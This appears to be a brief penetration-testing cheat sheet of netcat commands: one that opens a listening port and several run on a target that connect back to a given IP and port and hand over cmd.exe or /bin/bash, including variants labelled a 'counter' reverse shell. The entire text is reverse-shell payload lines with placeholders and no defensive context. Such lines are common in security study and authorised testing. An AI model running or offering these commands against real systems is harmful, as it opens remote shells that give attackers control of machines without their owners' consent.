# Listen:
nc -vnlp [PORT]

# Target:
nc -vn [IP] [PORT] -e [cmd.exe | /bin/bash]

# "counter" reverse shell:
(echo 0 && nc -vn [IP] [PORT] -e [cmd.exe | /bin/bash])
echo 0; nc -vn [IP] [PORT] -e [cmd.exe | /bin/bash]
